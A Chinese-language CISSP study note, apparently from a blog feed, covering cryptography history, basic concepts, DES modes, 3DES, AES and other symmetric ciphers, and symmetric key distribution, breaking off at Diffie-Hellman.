      <link href="/notes/cissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%886%EF%BC%89%E2%80%94%E2%80%94%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%8E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"/>
      <url>/notes/cissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%886%EF%BC%89%E2%80%94%E2%80%94%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%8E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/</url>
      <content type="html"><![CDATA[<p>在本章的考试大纲内容有：<br>安全工程</p><ul><li>I. 应用加密学<ul><li>I.1 密码学生命周期(例如，密码学的局限性、算法/协议的管理)</li><li>I.2 密码学的种类(对称密码学、非对称密码学、椭圆曲线密码学)</li><li>I.7 不可否认性</li><li>I.8 完整性(哈希和撤盐)</li></ul></li></ul><h3 id="6-1-密码学历史上的里程碑"><a href="#6-1-密码学历史上的里程碑" class="headerlink" title="6.1 密码学历史上的里程碑"></a>6.1 密码学历史上的里程碑</h3><p>　　伴随着人类通信的发展，为了对那些局外人隐藏通信的真正含义，保密的方法应运而生。古人类社会使有复杂的秘密符号系统代表战争中安全的地方。现代文明社会使用多种代码和密码促进个人和组织之间的私人通信。</p><h4 id="6-1-1-凯撒密码"><a href="#6-1-1-凯撒密码" class="headerlink" title="6.1.1 凯撒密码"></a>6.1.1 凯撒密码</h4><p>　　凯撒密码简单地将字母表中的每个字母都替换为其后的第三个字母。这是单一字母的替代置换密码，也被称C3密码。</p><h4 id="6-1-2-美国内战"><a href="#6-1-2-美国内战" class="headerlink" title="6.1.2 美国内战"></a>6.1.2 美国内战</h4><p>　　在美国内战期间，由于北部联邦和南部联邦的支持者都通过窃听对方的电报线路来刺探情报，因此双方对前线的安全通信都使用了相对先进的密码系统。这些系统使用词汇替代和置换(详细内容参看”密码”部分)的复杂组合，从而试图破坏敌人的破译企图。在内战中广泛使用的另一个系统是由军医Albert J.Myer开发的一系列标记符号。</p><h4 id="6-1-3-Ultra-与Enigma"><a href="#6-1-3-Ultra-与Enigma" class="headerlink" title="6.1.3 Ultra 与Enigma"></a>6.1.3 Ultra 与Enigma</h4><p>　　德国军事产业复合体为了官方使用而改造了一种名为Enigma的商业编码机。它使用一系列3到6个转子实现了一种极复杂的替换密码。使用同时代的技术对加密消息进行破译的唯一可行方法是使用类似的机器，这些机器应当具有与传输设备使用的相同转子设置。<br>　　同盟国军方开始了一项代号为川剧的绝密工作，其目的是对Enigma编码进行攻击。最终，当波兰军方成功地复原了一台Enigma原型机并且与英国和美国的密码术专家共享了他们的成果时，他们的努力得到了回报。同盟国在1940年成功地破解了Enigma编码，历史学家相信这次成功为最终战胜轴心国起到了重要的作用。<br>　　日本人在第二次世界大战期间使用了类似的一台机器，被称为Japanese Purple Machine。美国人对这个密码系统的攻击效果显著，导致日本人的密码在战争结束前就己被破解。</p><h3 id="6-2-密码学基础"><a href="#6-2-密码学基础" class="headerlink" title="6.2 密码学基础"></a>6.2 密码学基础</h3><h4 id="6-2-1-密码学的目标"><a href="#6-2-1-密码学的目标" class="headerlink" title="6.2.1 密码学的目标"></a>6.2.1 密码学的目标</h4><p>　　安全从业人员利用密码系统达到下列4个基本目标： 机密性、完整性、身份认证和不可否认性。实现每个目标都需要满足很多设计需求，并且不是所有的加密系统都要达到所有4个目标。</p><h5 id="1-机密性"><a href="#1-机密性" class="headerlink" title="1. 机密性"></a>1. 机密性</h5><p>　　机密性确保数据在存储中(例如，存储在磁盘上)或在传输中(例如，在两方或多方之间传递)保持秘密状态。强制实施机<br>密性的密码系统主要有两种类型： 对称密钥密码系统使密码系统中的所有用户都能够使用一个共享的密钥，公钥密码系统使系统中的每个用户都能够使用公钥和私钥的单独组合。<br>当开发以提供保密为目的的加密系统时，你必须考虑两种不同类型的数据：</p><ul><li>静态数据或存储数据，是指数据保存在固定和等待接入的位置。静态数据的例子包括存储在硬盘、磁带备份、云存储服务、USB设备和其他存储介质上的数据。</li><li>运动中的数据或线缆上的数据，是指在两个系统之间通过网络传输的数据。运动中的数据可能在企业网络、无线网络或公共互联网上进行传输。</li></ul><h5 id="2-完整性"><a href="#2-完整性" class="headerlink" title="2. 完整性"></a>2. 完整性</h5><p>　　完整性确保数据在传输的过程中不会被修改。完整性检查能确保存储的数据在创建和被访问期间不会遭受篡改。这样做可以防止所有形式的修改： 第三方企图插入错误信息的有意修改以及因传输过程中的错误导致的无意修改。消息完整性通过使用在传输消息时创建的数字签名消息摘要来强制实施。消息的接收者简单地对消息摘要和签名的有效性进行验证，确保消息未在传输过程中修改。公共和私钥密码系统都能够强制实施完整性。</p><h5 id="3-身份认证"><a href="#3-身份认证" class="headerlink" title="3. 身份认证"></a>3. 身份认证</h5><p>　　身份认证对声明的系统用户身份进行验证，并且是密码系统的主要功能。</p><h5 id="4-不可否认性"><a href="#4-不可否认性" class="headerlink" title="4. 不可否认性"></a>4. 不可否认性</h5><p>　　不可否认性为接收者提供了担保，保证消息确实来自发送者而不是来自伪装成发送者的人。不可否认性能够防止发送者宣称原先从未发送过信息(也被称为否认消息)。秘密密钥(或对称密钥)密码系统(如简单的替代密码)并不提供对不可否认性的保证。</p><h4 id="6-2-2-密码学概念"><a href="#6-2-2-密码学概念" class="headerlink" title="6.2.2 密码学概念"></a>6.2.2 密码学概念</h4><p>　　消息在成为编码形式之前，被称为明文消息，并且在描述加密函数时使用字母P表示。消息的发送者使用密码学算法将明文消息加密为密文消息，并且使用字母C表示。消息通过一些物理的或电子的方式被传送给接收者。接收者随后使用预先确定的算法对密文消息进行解密，从而得到明文形式的消息。<br>　　所有密码学算法都依赖密钥来维护其安全性。在很大程度上，密钥只不过是一个数字。密钥往往是一个非常大的二进制数，不过仍然是一个数字。每种算法都具有一个特定的密钥空间。密钥空间是一段值的范围，此范围内的值可作为密钥算法的有效密钥。密钥空间由其位的长度定义。位的长度只不过是密钥中的比特数或位数(0s和1s)。密钥空间的范围为： 从所有位全部为0到所有位全部为1。如果采用另一种方式表示，那么密钥空间的范围为0到2n，其中n是密钥的位的长度。因此，128位密钥的值可以从0到2128(大约为3.40282367* 10^38，这是一个相当大的数字)。保护密钥的安全是非常重要的。事实上，从密码学获得的所有安全性就只能依赖于保证秘密使用密钥的能力。</p><h4 id="6-2-3-密码学的数学原理"><a href="#6-2-3-密码学的数学原理" class="headerlink" title="6.2.3 密码学的数学原理"></a>6.2.3 密码学的数学原理</h4><h5 id="1-二进制数学"><a href="#1-二进制数学" class="headerlink" title="1. 二进制数学"></a>1. 二进制数学</h5><p>　　二进制数学定义了一些形成所有计算机神经系统的比特和字节所使用的规则。计算机依赖的二进制系统起源于电。在电流中，只有两种可能的状态： 开(代表存在电流)和关(代表没有电流)。电子设备执行的所有计算都必须利用这些术语来表达，这就出现了现代电子学中对二进制的使用。</p><h5 id="2-逻辑运算"><a href="#2-逻辑运算" class="headerlink" title="2. 逻辑运算"></a>2. 逻辑运算</h5><p>　　密码学的二进制数学使用多种逻辑函数来操纵数据。</p><ul><li><p>AND<br>AND 运算(用符号^表示)可以检查两个值是否都为真。在二进制数学中，每个变量都只有两种可能的值，因而为且也函数准备了4种可能的输入。</p></li><li><p>OR<br>OR运算(用符号v来表示)可以检查是否至少有一个输入值为真，只有在两个输入值都为假时，OR函数的结果才会返回假。</p></li><li><p>NOT<br>NOT 运算(用符号~或!来表示)简单地将输入值取反。</p></li><li><p>XOR<br>异或(XOR)操作通常用符号⊕表示。只有在一个输入值为真时，XOR函数的结果才为真。如果两个输入值都为假或都为真，那么XOR 函数的结果为假。</p></li></ul><h5 id="3-模函数"><a href="#3-模函数" class="headerlink" title="3. 模函数"></a>3. 模函数</h5><p>　　计算机本来也不理解小数系统，并且这些余数在计算机执行很多数学运算时起到了至关重要的作用。模函数十分简单，也就是在完成除法运算后得到余数。</p><h5 id="4-单向函数"><a href="#4-单向函数" class="headerlink" title="4. 单向函数"></a>4. 单向函数</h5><p>　　单向函数是一种数学运算，它可以通过所有可能的输入值组合得出结果，但是反向得出输入值却是不可能的。公钥密码系统都建立在单向函数的基础上。</p><h5 id="5-随机数"><a href="#5-随机数" class="headerlink" title="5. 随机数"></a>5. 随机数</h5><p>　　密码学往往通过在加密过程中添加随机性来获得强度。实现这个目标的一种方法是使用随机数。随机数是随机数字发生器，起到了数学函数中占位符变量的作用。执行数学函数时，占位符会被替换为在处理时刻生成的随机数。每次使用数学函数时，随机数都会产生一个独特的数字。随机数的一个更为人接受的示例是初始向量(Initialization Vector，IV)，这是一个与分组长度相同的随机比特串，并且与原始消息相异或。在每次使用相同密钥加密相同的消息时，IV都被用于创建独特的密文。</p><h5 id="6-零知识证明"><a href="#6-零知识证明" class="headerlink" title="6. 零知识证明"></a>6. 零知识证明</h5><p>　　密码学的一个优点是建立了这样的机制： 在不向第三方揭示事实本身的情况下向第三方证明对事实的了解。这种机制通常涉及密码和其他秘密的身份认证。</p><h5 id="7-分割知识"><a href="#7-分割知识" class="headerlink" title="7. 分割知识"></a>7. 分割知识</h5><p>　　如果执行某个操作所需的信息或权限在多个用户之间分配时，任何一个人都没有足够的权限来危害环境的安全性。单个解决方案中包含的这种职责分离和两人控制被称为分割知识。分割知识的最佳示例就是密钥托管的概念。通过使用密钥托管，密码密钥、数字签名甚至数字证书，可以被存储在或备份在一种被称为密钥托管数据库的特殊数据库中。</p><h5 id="8-工作函数"><a href="#8-工作函数" class="headerlink" title="8. 工作函数"></a>8. 工作函数</h5><p>　　通过使用工作函数或工作因数，从成本和/或时间方面来度量所有努力，就可以度量密码学系统的强度。通常，针对加密系统执行完全穷举攻击所需的时间和努力，就是工作函数所表示的内容。密码系统提供的安全性和保护与工作函辈U因数的值成正比。工作函数的大小应当与受保护资产的相对值匹配。工作函数只需稍大于受保护资产的时间值。换句话说，所有安全性(包括密码学)都应当是有效益的和有效率的。保护某个资产所花费的成本不能超过这个资产自身的价值，但是一定要保证提供足够的保护。因此，如果信息由于时间的推移而失去价值，那么工作函数的大小只需确保在数据失去价值前提供保护即可。</p><h4 id="6-2-4-密码"><a href="#6-2-4-密码" class="headerlink" title="6.2.4 密码"></a>6.2.4 密码</h4><h5 id="1-编码与密码"><a href="#1-编码与密码" class="headerlink" title="1. 编码与密码"></a>1. 编码与密码</h5><p>　　编码是密码学系统中表示词汇或短语的符号，有时是秘密的，但是不一定提供机密性。编码的常见示例是执法机构使用的通信”10系统”。 在这个系统中，语句”我收到你的信息，并且理解其含义”被表示成编码短语”10-4”这个编码是众人皆知的，但是它确实提供了通信的简易性。一些编码是秘密的。为了传输机密的消息，这些编码可能使用数学函数或密码字典来表示词汇、短语或句子。另一方面，密码总是意味着隐藏消息的真实含义。密码使用各种技术修改和/或重新排列消息中的字符或比特，从而实现机密性。在比特(也就是二进制编码的单个位)、字符(也就是ASCII码消息的单个字符)或分组(也就是一条消息的固定长度分段，通常用比特数表示)的基础上，密码将消息从明文转换为密文。</p><h5 id="2-换位密码"><a href="#2-换位密码" class="headerlink" title="2. 换位密码"></a>2. 换位密码</h5><p>　　换位密码使用某种加密算法重新排列明文消息中的字母，从而形成密文消息。解密算法只需反演加密转换过程就可以得到原始消息。</p><h5 id="3-替代密码"><a href="#3-替代密码" class="headerlink" title="3. 替代密码"></a>3. 替代密码</h5><p>　　替代密码使用加密算法将明文消息中的每一个字符或比特都替换为不同的宇符。与换位密码一样，有很多替代密码比本章提供的示例更复杂。多字母替代密码在相同的消息中使用多个字母表来阻碍解密操作。多字母替代密码的一个著名示例是Vigenere密码。虽然多宇母替代能够防范直接的频率分析，但是容易遭受二阶形式的频率分析(也被称为周期分析攻击，这种攻击基于密钥的重复使用进行频率检查)。</p><h5 id="4-一次性填充"><a href="#4-一次性填充" class="headerlink" title="4. 一次性填充"></a>4. 一次性填充</h5><p>　　一次性填充是一种极为强大的替代密码。一次性填充对明文消息的每个字母都使用一个不同的字母表。它们可以通过下面的加密函数来表示，其中K是以C表示的字母的加密密钥：</p><p><center>c = (P + K) mod 26</center><br>　　通常，一次性填充被记为插入函数的一个很长的数字序列。一次性填充的巨大好处是： 如果运用得当，它是一个不可破解的加密方案。由于不存在重复的字母替代模式，这使得密码分析工作徒劳无益。然而，为了确保算法的完整性，必须满足下列几个要求：</p><ul><li>加密密钥必须随机生成。使用一个短语或书中的一段话会引入密码分析人员破译这个编码的可能性。</li><li>一次性填充必须进行物理保护，以防泄露。如果敌人具有这个一次性填充的副本，那么他们就可以轻易地破译加密的消息。</li><li>每个一次性填充必须只使用一次。如果填充被重复使用，那么密码分析人员可以比较多个使用相同填充的加密消息中的相似之处，井有可能确定使用的密钥值。</li><li>密钥必须至少与被加密的消息一样长，这是因为每个密钥元素都只对消息中的一个字符进行编码。</li></ul><p>　　一次性填充一直被用于保护极其敏感的通信，不能被广泛使用的主要障碍是很难生成，以及分发和保护所需的冗长密钥。由于密钥的长度问题，一次性填充在实际中只可用于短消息。</p><h5 id="5-滚动密钥密码"><a href="#5-滚动密钥密码" class="headerlink" title="5. 滚动密钥密码"></a>5. 滚动密钥密码</h5><p>　　密码学的许多脆弱性都涉及密钥的有限长度。通过在加密和解密期间为每个密码转换使用不同的字母表，一次性填充避免了这些脆弱性。然而，因为要求填充的物理交换，所以一次性填充难以实现。对于这个难题，一个常见的解决方案是使用漆动密钥密码，也被称为书籍密码。在这种密码中，加密密钥与消息本身一样辰，并且往往从一般的书籍中选取。</p><h5 id="6-分组密码"><a href="#6-分组密码" class="headerlink" title="6. 分组密码"></a>6. 分组密码</h5><p>　　分组密码按消息的”组块”或分组进行操作，并且对整个消息分组同时应用加密算法。换位密码就是分组密码的一个例子。在挑战/响应算法中使用的简单算法，是取出完整的词汇井且逆向排列字母。更加复杂的柱状换位密码对整条消息(或一段消息)进行操作，并且使用换位算法和保密密钥对消息进行加密。大多数现代加密算法都实现了某些类型的分组密码。</p><h5 id="7-流密码"><a href="#7-流密码" class="headerlink" title="7. 流密码"></a>7. 流密码</h5><p>　　流密码对消息、(或数据流)中的每个字符或每一位进行操作，每次只处理一个字符/一位。凯撒密码就是流密码的一个例子。一次性填充也是一种流密码，这是因为该算法对明文信息中的每个宇符独立进行操作。流密码也可以作为一种分组密码使用。在此类情况下，某个缓冲区被填满实时数据，随后这些数据作为分组进行加密井传送给接收方。</p><h5 id="7-混淆与扩散"><a href="#7-混淆与扩散" class="headerlink" title="7. 混淆与扩散"></a>7. 混淆与扩散</h5><p>　　密码学算法依靠两种基本的操作来隐藏明文信息： 、混淆与扩散。混淆出现在明文和密钥的关系十分复杂时，此时攻击者不能通过继续修改明文和分析产生的密文来确定密钥。扩散出现在明文的改变导致多种变化时，这些变化被扩散到整个密文中。</p><h3 id="6-现代密码学"><a href="#6-现代密码学" class="headerlink" title="6. 现代密码学"></a>6. 现代密码学</h3><p>　　为了实现密码学的机密性、完整性、身份认证和不可否认性目标，现代密码系统利用计算复杂的算法和长密钥。</p><h4 id="6-3-1-密钥"><a href="#6-3-1-密钥" class="headerlink" title="6.3.1 密钥"></a>6.3.1 密钥</h4><p>　　在密码学的早期，其中一条主导原则就是” 通过隐匿实现安全”。密码学家们认为保护加密算法安全的最好办法就是对外人隐藏算法的细节。旧的密码系统要求通信双方保持对信息加密和解密所使用算法的安全性，井且不对第三方泄露。算法的任何泄露都可能导致对于对整个系统的破坏。<br>　　现代密码系统并不依赖于其算法的安全性。通过向公众开放审查，实际上也改善了算法的安全性。计算机安全机构对于算法的广泛分析，允许从业人员发现并纠正潜在的安全脆弱性，并且确保他们用于保护通信的算法尽可能安全。现代密码系统不依赖于保密的算法，而是依赖于具体的用户或用户组专用的一个或多个密钥。对换位密码的讨论中曾经提到过，柱状换位中使用的密钥被用于指导加密和解密操作。然而，只要选择了外人猜不出的密钥，柱状换位就可以被用于双方的安全通信。只要密钥的安全性得到维护，那么就不必担心第三方会知道算法的细节。</p><h4 id="6-3-2-对称密钥算法"><a href="#6-3-2-对称密钥算法" class="headerlink" title="6.3.2 对称密钥算法"></a>6.3.2 对称密钥算法</h4><p>　　对称密钥算法依赖于一个”共享的秘密”加密密钥，该密钥会被分发给所有参与通信的成员。所有通信成员都使用这个密钥进行消息的加密和解密，因此发送者和接收者都拥有共享密钥的副本。通信两端会使用相同的密钥加密和解密消息。当使用很长的密钥时，对称加密难以被破解。对称密钥算法主要被用于执行批量加密，并且只为安全服务提供机密性。对称密钥密码学也被称为秘密密钥密码学和私有密钥密码学。<br><img src="/notes/cissp学习笔记（6）——密码学与对称加密算法/对称密钥密码学.png"><br>对称密钥密码学具有下列几个弱点：</p><ul><li><strong>密钥分发是一个主要问题</strong> 在使用对称密钥协议建立通信之前，通信参与者必须具备一种安全交换密钥的方法。如果没有可用的安全电子通道，那么往往必须使用离线的密钥分发方法(已不属于交换) 。</li><li><strong>对密钥密码学井未实现不可否认性</strong> 由于任意通信方都可以利用共享的密钥对消息进行加密和解密，因此无法分辨指定消息的来源。</li><li><strong>这种算法不可扩展</strong> 对于大的用户组来说，使用对称密钥密码进行通信非常困难。只有在每个可能的用户组合共享私有密钥时，组中个人之间的安全专有通信才能实现。</li><li><strong>密钥必须经常更新</strong> 每当有成员离开用户组时，所有涉及这个成员的密钥都必须被抛弃。</li></ul><p>　　对称密钥密码学的主要强度在于能够以极快的速度进行操作。对称密钥算法的速度很快，通常是非对称密钥算法的1000倍到10000倍之间。鉴于其数学特性，对称密钥密码学还可以在硬件上实现，这为更高速度的运行创造了机会。</p><h4 id="6-3-3-非对称密钥算法"><a href="#6-3-3-非对称密钥算法" class="headerlink" title="6.3.3 非对称密钥算法"></a>6.3.3 非对称密钥算法</h4><p>　　非对称密钥算法也被称为公钥算法，它为对称密钥加密的弱点提供了解决方案。在这个系统中，每个用户都有两个密钥： 一个在所有用户之间共享的公钥，以及另一个只有用户自己知道并保管的私钥。但是让人意想不到的是： 相对立的和相关的密钥必须被先后应用于加密和解密。换句话说，如果使用公钥加密消息，那么只有相关的私钥能够进行解密，反之亦然。<br><img src="/notes/cissp学习笔记（6）——密码学与对称加密算法/非对称密钥密码学.png"><br>下面列出了非对称密钥密码学的主要优点：</p><ul><li><strong>增加新用户只需要生成一对公钥-私钥对</strong> 这个新用户与非对称密码系统中的所有用户通信时都使用这对相同的密钥，从而使得算法非常容易扩展。</li><li><strong>从非对称系统中更容易删除用户</strong> 非对称算法提供了一种密钥撤消机制，这个机制准许密钥被取消，从而能够有效地从非对称系统中删除用户。</li><li><strong>只有在用户的私钥被破坏时，才需要进行密钥重建</strong> 如果某位用户离开了公司，那么系统管理员只需要简单地将该用户的密钥作废即可。其他密钥都不会被破坏，因此其他用户都不需要进行密钥重建。</li><li><strong>非对称密钥加密提供了完整性、身份认证和不可否认性</strong> 如果某位用户没有与其他个体共享其私钥，那么具有该用户签名的消息就是正确无误的，并且具有特定的来源，在以后的任何时刻都不能被否认。</li><li><strong>密钥分发是一个简单的过程</strong> 希望加入非对称密码系统的用户，只需要使他们的公钥对于所有与他们进行通信的人来说可用就可以了。目前尚无办法从公钥导出私钥。</li><li><strong>不需要预先存在通信链接</strong> 两个个体可以从通信一开始就进行安全的通信。非对称密码学并不要求预先存在能够提供安全数据交换机制的关系。</li></ul><p>　　公钥密码学的主要弱点是运算速度慢。因此，很多需要安全传输大量数据的应用程序会使用公钥密码学建立连接，然后交换对称密钥。会话任务的剩余部分随后来用对称密码学开始运作。下表比较了对称和非对称密码学系统。仔细查看这个表可以发现，一种系统中的弱点恰好与另一种系统中的优点互补。</p><table><thead><tr><th>对称密码学系统</th><th>非对称密码学系统</th></tr></thead><tbody><tr><td>单个共享的密钥</td><td>密钥对</td></tr><tr><td>带外交换</td><td>带内交换</td></tr><tr><td>不可扩展</td><td>可扩展</td></tr><tr><td>快速</td><td>慢速</td></tr><tr><td>批量加密</td><td>小块数据分组、数字签名、数字封装、数字证书</td></tr><tr><td>机密性</td><td>完整性、机密性、身份认证、不可否认性</td></tr></tbody></table><h4 id="6-3-4-散列算法"><a href="#6-3-4-散列算法" class="headerlink" title="6.3.4 散列算法"></a>6.3.4 散列算法</h4><p>目前常用的一些散列算法：</p><ul><li>消息摘要2(MD2)</li><li>消息摘要5(MD5)</li><li>安全散列算法(SHA-0、SHA-l和SHA-2)</li><li>基于散列的消息身份认证代码(Hashed Message Authentication Code，HMAC)</li></ul><h3 id="6-4-对称密码"><a href="#6-4-对称密码" class="headerlink" title="6.4 对称密码"></a>6.4 对称密码</h3><h4 id="6-4-1-数据加密标准"><a href="#6-4-1-数据加密标准" class="headerlink" title="6.4.1 数据加密标准"></a>6.4.1 数据加密标准</h4><p>　　美国政府在1977年公布了数据加密标准(DES)，并且将之作为向所有政府通信而提议的标准密码系统。由于该算法中的缺陷，密码学界和政府不再认为DES是安全的。大家普遍相信情报机构已经能轻易破解DES加密的信息。DES在2001年12月被高级加密标准取代。<br>　　DES是一个64位的分组密码，具有5种操作模式： 电子代码本(Electronic CodeBook，ECB)模式、密码分组链接(Cipher Block Chaining，CBC)模式、密码回馈(Cipher FeedBack，CFB)模式以及输出回馈(Output FeedBack，OFB)模式和计数(CounTeR，CTR)模式。这些模式将在接下来的内容中进行阐述。所有DES模式每次处理64位的明文，并且生成一个64位的密文分组。DES使用的密钥长度为56位。DES 利用长序列的异或(XOR)操作生成密文。每个加密/解密操作都要重复16次这个过程，每次重复通常被称为”一轮”加密，因此DES要执行16轮加密。</p><h5 id="1-电子代码本模式"><a href="#1-电子代码本模式" class="headerlink" title="1. 电子代码本模式"></a>1. 电子代码本模式</h5><p>　　电子代码本(ECB)模式是最容易了解的模式，但安全性最差。这个算法每次处理一个64位分组，它简单地使用所选择的密钥对这个分组进行加密。这意味着如果算法多次遇到相同的分组，那么将产生完全相同的加密分组。除了最短传输之外，这个脆弱性使得通过ECB模式进行传输并不现实。在日常使用中，ECB只被用于交换少量数据。例如，启动其他DES模式的密钥和参数以及数据库中的单元。</p><h5 id="2-密码分组链接模式"><a href="#2-密码分组链接模式" class="headerlink" title="2. 密码分组链接模式"></a>2. 密码分组链接模式</h5><p>　　在密码分组链接(CBC)模式中，未加密文本的每个分组在使用DES算法加密之前，都与前一密文分组进行异或操作。解密过程简单地将密文解密，并且反向执行异或操作。CBC创建了一个IV，并且将这个IV与消息的第一个分组相异或，从而每次操作都生成独特的输出。IV必须被发送给接收方，我们既可以将IV以明文形式置于完整的密文之前，也可以使用与消息所用的相同的密钥通过ECB加密模式保护它。在使用CBC 模式时，需要考虑的一个重要问题是错误传播，也就是如果一个分组在传输中被破坏，那么这个分组将无法解密，并且下一个分组也是如此。</p><h5 id="3-密码回馈模式"><a href="#3-密码回馈模式" class="headerlink" title="3. 密码回馈模式"></a>3. 密码回馈模式</h5><p>　　密码回馈(CFB)模式是流密码形式的CBC。换句话说，CFB针对实时生成的数据进行操作。不过，CFB并不将消息分为若干分组，而是使用相同分组大小的内存缓冲区。在缓冲区被填满时，对数据进行加密并发送给接收方。接着，系统等待下一个缓冲区被新生成的数据填满，然后继续进行加密和传输。除了将先前存在的数据变化为实时数据，CFB的操作方式与CBC一样，也使用了IV和链接。</p><h5 id="4-输出回馈模式"><a href="#4-输出回馈模式" class="headerlink" title="4. 输出回馈模式"></a>4. 输出回馈模式</h5><p>　　在输出回馈(OFB)模式中，DES的操作样式几乎与在CFB模式中的操作样式完全相同。不过，DES并不将明文分组与前一个密文分组的加密版本相异或，而是将明文与某个种子值相异或。对于第一个被加密的分组来说，初始向量被用于创建种子值。通过对先前的种子值运行DES算法，就可以派生出之后的种子值。OFB模式的主要优点是不存在链接功能，并且传输错误不会通过传播影响之后分组的解密。</p><h5 id="5-计数模式"><a href="#5-计数模式" class="headerlink" title="5. 计数模式"></a>5. 计数模式</h5><p>　　在计数(CTR)模式中运行的DES使用的流密码，类似于在CFB和OFB模式中使用的流密码。不过，这种模式并不根据前一个种子值的结果为每个加密/解密操作创建种子值，而是使用一个简单的、每次操作后都增加的计数。与OFB模式一样，CTR模式中也不传播错误。</p><h4 id="6-4-2-三重数据加密算法-3DES"><a href="#6-4-2-三重数据加密算法-3DES" class="headerlink" title="6.4.2 三重数据加密算法(3DES)"></a>6.4.2 三重数据加密算法(3DES)</h4><p>　　3DES具有4种版本。第1种版本只是使用三个不同的密钥(K1、K2和K3)对明文加密三次。它被称为DES-EEE3模式(三个E表示存在三个加密操作，而数字3表示使用三个不同的密钥)，这种模式可以利用下面的符号来表示，其中E(K，P)表示使用密钥K加密明文P：</p><p><center>E(K1，E(K2，E(K3，P)))</center><br>　　DES-EEE3 具有的密钥的有效长度为168位。<br>　　第2种3DES版本DES-EDE3也使用三个密钥，但是将第二个加密操作替换为解密操作，如下所示：</p><p><center>E(K1，D(K2，E(K3，P)))</center><br>　　第3种3DES版本DES-EEE2只使用两个密钥Kl和K2，如下所示：</p><p><center>E(K1，E(K2，E(Kl，P)))</center><br>　　第4种3DES版本DES-EDE2也使用两个密钥，但是在中间使用一个解密操作，如下所示：</p><p><center>E(K1，D(K2E(K1，P)))</center><br>　　第3种和第4种3DES 版本具有的密钥的有效长度都为112位。</p><h4 id="6-4-3-国际数据加密算法-IDEA"><a href="#6-4-3-国际数据加密算法-IDEA" class="headerlink" title="6.4.3 国际数据加密算法(IDEA)"></a>6.4.3 国际数据加密算法(IDEA)</h4><p>　　国际数据加密算法(IDEA)的分组密码是针对DES算法的密钥长度不够而开发的。与DES一样，IDEA对64位的明文/密文分组进行操作。然而，国际数据加密算法采用128位的密钥进行操作。这个密钥随后在一系列操作中被分解成52个16位的子密钥。这些子密钥接着使用异或和模运算的组合对输入的文本进行操作，从而生成输入消息的加密/解密版本。IDEA能够在DES使用的4种模式(ECB、CBC、CFB和OFB)中工作。</p><h4 id="6-4-4-Blowfish"><a href="#6-4-4-Blowfish" class="headerlink" title="6.4.4 Blowfish"></a>6.4.4 Blowfish</h4><p>　　Bruce Schneier的Blowfish分组密码是DES和IDEA的另一种选择。与它的这些前辈们一样，Blowfish对64位文本分组进行操作。然而，Blowfish扩展了IDEA的密钥强度，甚至准许使用变长密钥，范围从相对不安全的32位到相当难破解的448位。很显然，较长的密钥将导致加密/解密时间的相应增加。不过，计时试验已经表明，Blowfish是比IDEA和DES更快的算法。</p><h4 id="6-4-5-Skipjack"><a href="#6-4-5-Skipjack" class="headerlink" title="6.4.5 Skipjack"></a>6.4.5 Skipjack</h4><p>　　Skipjack算法由美国政府在联邦信息处理标准(Federal Information Processing Standard，FIPS)185，即托管加密标准证书(Escrowed Encryption Standard，EES)中批准使用。与许多分组密码一样，Skipjack对64位的文本分组进行操作。这种算法使用一个80位的密钥，并且支持DES支持的相同4种操作模式。</p><h4 id="6-4-6-高级加密标准-AES"><a href="#6-4-6-高级加密标准-AES" class="headerlink" title="6.4.6 高级加密标准(AES)"></a>6.4.6 高级加密标准(AES)</h4><p>　　AES密码准许使用三种密钥强度：128位、192位和256位。AES最初的规范支持128位分组的处理，但是Rijndael超出了这个规范，它准许密码学家使用与密钥长度相等的分组大小。如下所示，加密的轮数依赖于所边的密钥长度：</p><ul><li>128位密钥需要10轮加密。</li><li>192位密钥需要12轮加密。</li><li>256位密钥需要14轮加密。</li></ul><p>下表列出了某些常见且著名的对称加密算法及其分组大小和密钥大小：</p><table><thead><tr><th>算法名</th><th>分组大小(单位为位)</th><th>密钥大小(单位为位)</th></tr></thead><tbody><tr><td>数据加密标准(DES)</td><td>64</td><td>56</td></tr><tr><td>三重DES(3DES)</td><td>64</td><td>112或168</td></tr><tr><td>高级加密标准(AES)</td><td>128</td><td>128、192、256</td></tr><tr><td>Rijndael</td><td>可变</td><td>128、192、256</td></tr><tr><td>Twofish</td><td>128</td><td>1-256</td></tr><tr><td>Blowfish(通常在SSH中使用)</td><td>64</td><td>32-448</td></tr><tr><td>IDEA(在PGP中使用)</td><td>64</td><td>128</td></tr><tr><td>基于RSA的Rivest密码5(RC5)</td><td>32、64、128</td><td>0-2040</td></tr><tr><td>基于RSA的Rivest密码4(RC4)</td><td>流式</td><td>128</td></tr><tr><td>基予RSA的Rivest密码2(RC2)</td><td>64</td><td>128</td></tr><tr><td>Skipjack</td><td>64</td><td>80</td></tr></tbody></table><h4 id="6-4-7-对称密钥管理"><a href="#6-4-7-对称密钥管理" class="headerlink" title="6.4.7 对称密钥管理"></a>6.4.7 对称密钥管理</h4><p>　　由于加密密钥中包含的信息对于密码系统而言是至关重要的，因此密码系统的管理员和用户必须采取特殊的措施以保护密钥材料的安全。这些安全措施被统称为密钥管理实践。它们包含密钥的生成、分发、存储、销毁、恢复和托管。</p><h5 id="1-创建和分发对称密码"><a href="#1-创建和分发对称密码" class="headerlink" title="1. 创建和分发对称密码"></a>1. 创建和分发对称密码</h5><ul><li><strong>离线分发</strong> 在技术方面最简单的方法涉及密钥材料的物理交换。一方向另一方提供包含密钥的一张纸或一份存储介质。在很多硬件加密设备中，密钥材料以电子设备的形式存在，这类似于插入到加密设备中的真实的钥匙。然而，这些方法都具有各自固有的缺陷。如果通过电子邮件发送密钥材料，那么密钥材料就可能被截获。电话可能会被窃听。包含密钥的纸张则可能被无意丢进废纸篓或丢失。</li><li><strong>公钥加密</strong> 许多通信人员希望在没有密钥分发之争的情况下获得密钥加密的速度优势。因此，许多人使用公钥加密来建立初始的通信链接。一旦链接成功建立，并且双方对相互的身份都感到满意，那么他们就会在安全的公钥链接上交换密钥。随后，通信双方从基于公钥算法的通信进入基于秘密密钥算法的通信，并且能够享受快速的处理过程。一般而言，与公钥加密相比，私有密钥加密的速度快数千倍。</li><li><strong>Diffie-Hellman算法</strong> 